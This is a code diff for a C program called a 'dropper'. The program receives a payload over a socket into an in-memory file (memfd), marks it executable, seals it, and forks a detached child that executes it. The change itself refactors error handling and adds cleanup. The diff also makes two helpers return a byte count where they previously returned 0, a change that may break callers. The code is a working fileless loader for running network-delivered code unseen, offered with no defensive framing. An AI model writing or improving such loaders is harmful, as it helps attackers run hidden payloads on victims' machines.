@@ -156,12 +156,14 @@ static int accept_one_client(int listen_fd, int client_timeout_seconds, int *cli
  */
 static int receive_size_header(int client_fd, uint64_t *file_size_out) {
     uint64_t network_byte_order_size;
+    int ret = 0;
 
-    if (receive(client_fd, &network_byte_order_size, sizeof(network_byte_order_size)) < 0)
-        return -errno;
+    ret = receive(client_fd, &network_byte_order_size, sizeof(network_byte_order_size));
+    if (ret < 0)
+        return ret;
 
     *file_size_out = be64toh(network_byte_order_size);
-    return 0;
+    return ret;
 }
 
 /**
@@ -173,7 +175,7 @@ static int receive_size_header(int client_fd, uint64_t *file_size_out) {
  * @return int
  */
 static int create_sized_memory_file(const char *name, uint64_t size_in_bytes, int *memory_fd_out) {
-    int memory_fd = memfd_create(name, MFD_ALLOW_SEALING);
+    int memory_fd = memfd_create(name, MFD_ALLOW_SEALING | MFD_CLOEXEC);
     if (memory_fd < 0)
         return -errno;
 
@@ -199,13 +201,15 @@ static int stream_payload_into_fd(int client_fd, int destination_fd, uint64_t to
     char transfer_buffer[RECEIVE_BUFFER_SIZE];
     uint64_t bytes_remaining = total_bytes;
     off_t write_offset = 0;
+    int ret = 0;
 
     while (bytes_remaining > 0) {
         size_t chunk_size = (bytes_remaining < sizeof(transfer_buffer)) ? (size_t)bytes_remaining
                                                                         : sizeof(transfer_buffer);
 
-        if (receive(client_fd, transfer_buffer, chunk_size) < 0)
-            return -errno;
+        ret = receive(client_fd, transfer_buffer, chunk_size);
+        if (ret < 0)
+            return ret;
 
         ssize_t bytes_written = pwrite(destination_fd, transfer_buffer, chunk_size, write_offset);
         if (bytes_written != (ssize_t)chunk_size)
@@ -215,7 +219,7 @@ static int stream_payload_into_fd(int client_fd, int destination_fd, uint64_t to
         bytes_remaining -= chunk_size;
     }
 
-    return 0;
+    return ret;
 }
 
 /**
@@ -309,24 +313,32 @@ int dropper_run(dropper_context_t *dropper_ctx) {
     if (dropper_ctx->memory_file_fd < 0)
         return -EBADF;
 
+    int ret = 0;
+
     /* Making the memfd executable and sealing it before forking. */
-    if (fchmod(dropper_ctx->memory_file_fd, 0700) < 0)
-        return -errno;
+    if (fchmod(dropper_ctx->memory_file_fd, 0700) < 0) {
+        ret = -errno;
+        goto cleanup;
+    }
 
     if (fcntl(dropper_ctx->memory_file_fd, F_ADD_SEALS,
-              F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE | F_SEAL_SEAL) < 0)
-        return -errno;
+              F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE | F_SEAL_SEAL) < 0) {
+        ret = -errno;
+        goto cleanup;
+    }
 
     int exec_error_pipe[2];
-    if (pipe2(exec_error_pipe, O_CLOEXEC) < 0)
-        return -errno;
+    if (pipe2(exec_error_pipe, O_CLOEXEC) < 0) {
+        ret = -errno;
+        goto cleanup;
+    }
 
     pid_t child_pid = fork();
     if (child_pid < 0) {
-        int saved_errno = errno;
+        ret = -errno;
         close(exec_error_pipe[0]);
         close(exec_error_pipe[1]);
-        return -saved_errno;
+        goto cleanup;
     }
 
     if (child_pid == 0) {
@@ -366,7 +378,20 @@ int dropper_run(dropper_context_t *dropper_ctx) {
     close(exec_error_pipe[0]);
 
     if (bytes_read == (ssize_t)sizeof(child_errno))
-        return -child_errno; /* Exec failed */
+        ret = -child_errno; /* Exec failed */
 
-    return 0; /* Exec succeeded, child runs detached, kernel reaps it */
+cleanup:
+    /* Close copy and return, the kernel will reap the child if created */
+    dropper_cleanup(dropper_ctx);
+    return ret; /* Exec succeeded, child runs detached, kernel reaps it */
+}
+
+void dropper_cleanup(dropper_context_t *dropper_ctx) {
+    if (!dropper_ctx)
+        return;
+
+    if (dropper_ctx->memory_file_fd >= 0) {
+        close(dropper_ctx->memory_file_fd);
+        dropper_ctx->memory_file_fd = -1;
+    }
 }
